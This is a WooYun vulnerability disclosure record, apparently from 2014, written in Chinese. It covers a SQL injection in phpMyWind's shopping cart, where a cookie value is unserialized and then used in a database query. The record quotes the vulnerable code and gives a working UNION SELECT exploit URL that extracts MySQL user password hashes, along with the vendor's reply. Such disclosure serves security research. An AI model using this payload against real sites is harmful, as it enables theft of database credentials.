{"id": 58749, "wybug_id": "wooyun-2014-049845", "wybug_title": "phpMyWind又一注入无视补丁", "wybug_corp": "phpmywind.com", "wybug_author": "灰色", "wybug_date": "2014-02-24 11:32", "wybug_open_date": "2014-04-10 11:33", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-10：\t细节向公众公开  简要描述： phpMyWind又一注入无视补丁 详细说明：  废话不多说了，看正文吧。0x01 漏洞原理漏洞在shoppingcart.php文件大约152行处：\n<?php                  //初始化参数                $totalprice = '';                $shoppingcart = unserialize(AuthCode($_COOKIE['shoppingcart']));                  //显示订单列表                foreach($shoppingcart as $k=>$goods)                {                ?>                <tr>                        <td height=\"30\">                        <?php                          //获取数据库中商品信息[color=#ff0000]                        $r = $dosql->GetOne(\"SELECT * FROM `#@__goods` WHERE `id`=\".$goods[0]);[/color]//省略部分代码\n可以从代码开始部分看到，$goods变量是从cookie中取出的shoppingcart字段值直接反序列化后的内容，没有进行任何的过滤和校验。0x02 利用分析我们先来整理下我们目前所获得的信息，我们可以通过控制cookie中的shoppingcart字段值来向代码中传入自定义内容，这部分内容是一个数组，并且第一个元素会没有经过任何校验和过滤带入到SQL查询中。但是cookie中的这个字段会进行AuthCode的解码处理，这个处理需要用到服务端所使用到的key，这是我们无法获得的，所以我们需要找一个地方将我们所自定义的内容继续进行AuthCode的编码处理。我是怎么找到这个地方的呢？且听我慢慢到来。这个漏洞是在看T00ls社区M3loee所公布的《T00ls元旦献礼之一：PhpMyWind SQL Injection 0day》时发现的。所以我们先来看下这个漏洞出现问题的分支部分代码：\nif($a == 'addshopingcart'){           //省略部分代码                  //初始化购物车字符串        if(!empty($_COOKIE['shoppingcart']))                $shoppingcart = unserialize(AuthCode($_COOKIE['shoppingcart']));        else                $shoppingcart = array();            //选中信息存入数组        if(isset($goodsid) &&           isset($buynum) &&           isset($goodsattr))        {[color=#ff0000]                $shoppingcart[] = array($goodsid, $buynum, $goodsattr);[/color]        }            //存入COOKIE[color=#ff0000]        setcookie('shoppingcart', AuthCode(serialize($shoppingcart),'ENCODE'));[/color]        echo TRUE;        exit();}//省略部分代码\n看到setcookie那行，就是对$shoppingcart变量内容进行序列化并发送至cookie。而phpMyWind的参数传递风格是使用for循环将GET和POST参数进行变量化的，就像DeDecms一样。这样的话，$goodsid、$buynum和$goodsattr三个变量的内容是可以控制的。再看$shoppingcart变量的赋值，可以发现之前那段代码中的goods[0]就是这里的$goodsid。到这里我们重新整理下思路，在addshopingcart这个分支中，通过提交goodsid参数向$shoppingcart[0]中赋值，然后$shoppingcart被序列化发送到客户端。客户端再次访问这个页面，并发送刚刚得到的cookie，服务端将shoppingcart的值进行发序列化，并将数组中第一个元素的值带入到SQL查询中。这样如果我们向goodsid中传递带有恶意查询的内容，就会造成SQL注入问题。并且我们还在后面的页面输出中发现这样一行代码：\n1echo '<a href=\"goodsshow.php?cid='.$r['classid'].'&tid='.$r['typeid'].'&id='.$r['id'].'\" class=\"title\" target=\"_blank\">'[color=#ff0000].$r['title'].[/color]'</a>';\n也就是说我们可以将注入结果放置到title这个字段中，就可以直接获取SQL查询的回显了，不再需要报错或者盲注了。0x03 漏洞重现首先访问http://192.168.188.142/shoppingcart.php?a=addshopingcart&goodsid=1 and @`'` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from mysql.user where 1=1 or @`'`&buynum=1&goodsattr=tpcs然后访问?1http://192.168.188.142/phpmywind4.6.6/shoppingcart.php，获取注入信息，效果如下图所示：\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 灰色@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-03-03 13:42 厂商回复： 漏洞确实存在，但是已经有另一位白帽子在您之前提交过。感谢您的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}